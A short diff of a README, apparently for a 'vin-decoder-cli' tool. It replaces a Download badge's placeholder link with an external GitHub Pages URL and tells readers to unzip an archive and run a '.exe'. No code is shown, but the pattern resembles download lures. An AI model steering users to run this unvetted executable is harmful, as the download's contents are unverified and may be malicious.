@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application or execute via terminal commands.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://vin-decoder-cli.github.io/.github/)
 
 ## 📸 Overview
 <img width="333" height="306" alt="vin-decoder-cli-main-interface" src="https://github.com/user-attachments/assets/1de53773-4a2e-499a-8a4e-54a2e0560daa" />
